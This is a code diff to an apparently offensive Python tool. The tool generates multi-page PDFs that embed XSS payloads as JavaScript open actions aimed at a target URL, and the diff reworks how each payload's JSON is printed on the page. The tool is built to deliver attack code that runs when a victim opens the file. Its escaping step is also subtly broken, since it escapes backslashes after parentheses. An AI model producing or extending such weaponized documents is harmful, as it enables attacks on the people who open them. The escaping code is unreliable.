@@ -179,6 +179,28 @@ def wrap_text_for_pdf(text, max_chars_per_line=70):
     
     return lines
 
+def format_json_for_pdf(payload_data, max_chars_per_line=70):
+    """Format JSON payload data for readable display in PDF"""
+    if not payload_data:
+        return []
+    
+    # Create a formatted JSON string with nice indentation
+    json_str = json.dumps(payload_data, indent=2, ensure_ascii=False)
+    
+    # Split into lines and wrap long lines
+    json_lines = json_str.split('\n')
+    formatted_lines = []
+    
+    for line in json_lines:
+        if len(line) <= max_chars_per_line:
+            formatted_lines.append(line)
+        else:
+            # For long lines, try to wrap at reasonable points
+            wrapped = wrap_text_for_pdf(line, max_chars_per_line)
+            formatted_lines.extend(wrapped)
+    
+    return formatted_lines
+
 def create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths):
     """Create a single PDF file with multiple pages - one payload per page with full payload display"""
     pdf_files = []
@@ -216,35 +238,39 @@ def create_single_pdf_with_pages(payloads, target_url, pdf_version, os_paths):
         pdf_content += f"/AA << /O << /S /JavaScript /JS ({payload}) >> >> "
         pdf_content += ">>\nendobj\n"
         
-        # Content stream with full payload display
+        # Content stream with full JSON payload display and execution
         description = payload_data.get('description', 'XSS Payload')
         technique = payload_data.get('technique', 'Unknown')
         risk_level = payload_data.get('risk_level', 'medium')
         
-        # Wrap the full payload text
-        payload_lines = wrap_text_for_pdf(payload, 70)
+        # Format the entire JSON object for display
+        json_lines = format_json_for_pdf(payload_data, 65)
         
         # Calculate content length dynamically
         content_lines = []
         content_lines.append("BT")
-        content_lines.append("/F1 12 Tf")
+        content_lines.append("/F1 10 Tf")  # Slightly smaller font to fit more content
         content_lines.append("50 750 Td")
         content_lines.append(f"(Payload #{i+1}: {description}) Tj")
+        content_lines.append("0 -15 Td")
+        content_lines.append(f"(Technique: {technique} | Risk: {risk_level}) Tj")
         content_lines.append("0 -20 Td")
-        content_lines.append(f"(Technique: {technique}) Tj")
-        content_lines.append("0 -20 Td")
-        content_lines.append(f"(Risk Level: {risk_level}) Tj")
-        content_lines.append("0 -30 Td")
-        content_lines.append("(Full Payload:) Tj")
-        content_lines.append("0 -20 Td")
+        content_lines.append("(Complete Payload JSON Reference:) Tj")
+        content_lines.append("0 -15 Td")
+        content_lines.append("(=====================================) Tj")
+        content_lines.append("0 -10 Td")
         
-        # Add wrapped payload lines
-        for line in payload_lines:
+        # Add formatted JSON lines
+        for line in json_lines:
             # Escape special characters for PDF
             escaped_line = line.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
             content_lines.append(f"({escaped_line}) Tj")
-            content_lines.append("0 -15 Td")
+            content_lines.append("0 -12 Td")
         
+        content_lines.append("0 -10 Td")
+        content_lines.append("(=====================================) Tj")
+        content_lines.append("0 -15 Td")
+        content_lines.append("(NOTE: Payload also embedded for execution on this page) Tj")
         content_lines.append("ET")
         
         content_stream = "\n".join(content_lines)
